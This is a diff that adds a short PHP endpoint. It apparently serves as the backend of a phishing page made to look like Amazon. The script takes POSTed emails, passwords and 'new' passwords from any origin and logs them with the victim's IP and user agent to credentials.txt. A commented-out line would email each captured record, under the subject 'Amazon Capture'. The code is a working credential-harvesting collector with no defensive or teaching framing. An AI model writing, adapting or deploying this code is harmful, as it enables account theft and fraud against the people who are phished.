@@ -1,0 +1,22 @@
+<?php
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST');
+header('Access-Control-Allow-Headers: Content-Type');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = json_decode(file_get_contents('php://input'), true);
+    
+    // Log to file (secure this directory!)
+    $log = date('Y-m-d H:i:s') . " | IP: {$_SERVER['REMOTE_ADDR']} | UA: {$input['user_agent']} | Email: {$input['email']} | Pass: {$input['password']} | New: {$input['new_password']}\n";
+    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
+    
+    // Optional: Email notification
+    // mail('your@email.com', 'Amazon Capture', $log);
+    
+    echo json_encode(['status' => 'success']);
+} else {
+    http_response_code(405);
+    echo json_encode(['error' => 'Method not allowed']);
+}
+?>
